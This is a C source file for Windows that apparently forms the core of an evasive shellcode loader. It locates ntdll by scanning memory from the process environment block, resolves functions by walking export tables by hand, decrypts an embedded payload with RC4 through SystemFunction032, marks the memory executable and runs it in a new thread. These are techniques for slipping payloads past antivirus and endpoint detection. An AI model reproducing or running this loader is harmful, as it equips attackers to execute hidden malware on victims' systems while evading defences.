#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <winternl.h>
#include "core.h"

void* _memcpy(void *dst, const void *src, size_t n)
{
    volatile unsigned char *d = dst;  /* avoid gcc optimizations */
    const unsigned char *s = src;

    if ((size_t)dst - (size_t)src >= n)
    {
        while (n--) *d++ = *s++;
    }
    else
    {
        d += n - 1;
        s += n - 1;
        while (n--) *d-- = *s--;
    }
    return dst;
}

int _strcmp(const char *str1, const char *str2)
{
    while (*str1 && *str1 == *str2) { str1++; str2++; }
    if ((unsigned char)*str1 > (unsigned char)*str2) return 1;
    if ((unsigned char)*str1 < (unsigned char)*str2) return -1;
    return 0;
}

E_PPEB Peb()
{
	return (E_PPEB)(NtCurrentTeb()->ProcessEnvironmentBlock);
}

HMODULE FindNtdllBase()
{
	UINT_PTR p = NULL;
	for (p = Peb()->pLdr; ; p--)
	{
		if (*(WORD*)(p) == 0x5A4D)
		{
			WORD peHdr = *(WORD*)(p + 0x3C);
			if (peHdr < 0x400 && *(DWORD*)(p + peHdr) == 0x00004550)
			{
				break;
			}
		}
	}
	return (HMODULE)p;
}

FARPROC GetProcAddr(HMODULE module, PCHAR proc)
{
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)module;
	PIMAGE_NT_HEADERS ntHeaders = RVA2VA(PIMAGE_NT_HEADERS, module, dosHeader->e_lfanew);
	PIMAGE_DATA_DIRECTORY dataDir = (PIMAGE_DATA_DIRECTORY)ntHeaders->OptionalHeader.DataDirectory;
	DWORD virtualAddress = dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (virtualAddress == 0) return NULL;
	PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)RVA2VA(ULONG_PTR, module, virtualAddress);
	SIZE_T exportDirSize = RVA2VA(ULONG_PTR, module, dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].Size);
	if (!exportDir) return NULL;

	DWORD numberOfNames = exportDir->NumberOfNames;
	PDWORD functions = RVA2VA(PDWORD, module, exportDir->AddressOfFunctions);
	PDWORD names = RVA2VA(PDWORD, module, exportDir->AddressOfNames);
	PWORD ordinals = RVA2VA(PWORD, module, exportDir->AddressOfNameOrdinals);
	for (DWORD i = 0; i < numberOfNames; i++)
	{
		PCHAR functionName = RVA2VA(PCHAR, module, names[i]);
		if (_strcmp(functionName, proc) == 0)
		{
			FARPROC functionAddr = RVA2VA(FARPROC, module, functions[ordinals[i]]);
			return functionAddr;
		}
	}
	return NULL;
}

void Run(PCHAR bin, int binSize, PCHAR key, int keySize) 
{
	HMODULE hNtdll = FindNtdllBase();
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddr(hNtdll, "NtAllocateVirtualMemory");
	if (NtAllocateVirtualMemory == NULL) return;

	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetProcAddr(hNtdll, "NtProtectVirtualMemory");
	if (NtProtectVirtualMemory == NULL) return;

	_LdrLoadDll LdrLoadDll = (_LdrLoadDll)GetProcAddr(hNtdll, "LdrLoadDll");
	if (LdrLoadDll == NULL) return;

	HMODULE hCryptsp = NULL;
	int size = 7 * sizeof(WCHAR);
	UNICODE_STR uStr = { .Length = size, .MaximumLength = size + sizeof(WCHAR), .pBuffer = L"cryptsp"};
	NTSTATUS status = LdrLoadDll(NULL, 0, &uStr, &hCryptsp);
	if (status != 0 || hCryptsp == NULL) return; 

	_SystemFunction032 SystemFunction032 = (_SystemFunction032)GetProcAddr(hCryptsp, "SystemFunction032");
	if (SystemFunction032 == NULL) return;

	LPVOID baseAddress = NULL;
	SIZE_T sizet = (SIZE_T)binSize;
	
	status = NtAllocateVirtualMemory((HANDLE)-1, &baseAddress, 0, &sizet, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status == 0)
	{
		_memcpy(baseAddress, bin, binSize);
		struct ustring {
			DWORD Length;
			DWORD MaximumLength;
			PUCHAR Buffer;
		} sBin, sKey;

		sBin.Buffer = (PUCHAR)baseAddress;
		sBin.Length = binSize;
		sBin.MaximumLength = binSize;

		sKey.Buffer = (PUCHAR)key;
		sKey.Length = keySize;
		sKey.MaximumLength = keySize;

		status = SystemFunction032(&sBin, &sKey);
		if (status == 0)
		{
			ULONG ulOldProtect = 0;
			status = NtProtectVirtualMemory((HANDLE)-1, &baseAddress, &sizet, PAGE_EXECUTE_READ, &ulOldProtect);
			if (status == 0)
			{
				//((void(*)())baseAddress)();
				_LdrGetDllHandle LdrGetDllHandle = (_LdrGetDllHandle)GetProcAddr(hNtdll, "LdrGetDllHandle");
				if (LdrGetDllHandle == NULL) return;
				HMODULE hKernel32 = NULL;
				UNICODE_STR k32 = { .pBuffer = L"kernel32.dll", .Length = 12 * sizeof(WCHAR), .MaximumLength = 12 * sizeof(WCHAR) + sizeof(WCHAR) };
				NTSTATUS status = LdrGetDllHandle(NULL, NULL, &k32, &hKernel32);
				if (status == 0)
				{
					_CreateThread CreateThread = (_CreateThread)GetProcAddr(hKernel32, "CreateThread");
					if (CreateThread == NULL) return;
					
					_NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetProcAddr(hNtdll, "NtWaitForSingleObject");
					if (NtWaitForSingleObject == NULL) return;
					
					HANDLE hThread = CreateThread(NULL, 0, baseAddress, NULL, 0, NULL);
					NtWaitForSingleObject((HANDLE)-1, FALSE, NULL);
				}
			}
		}
	}
}
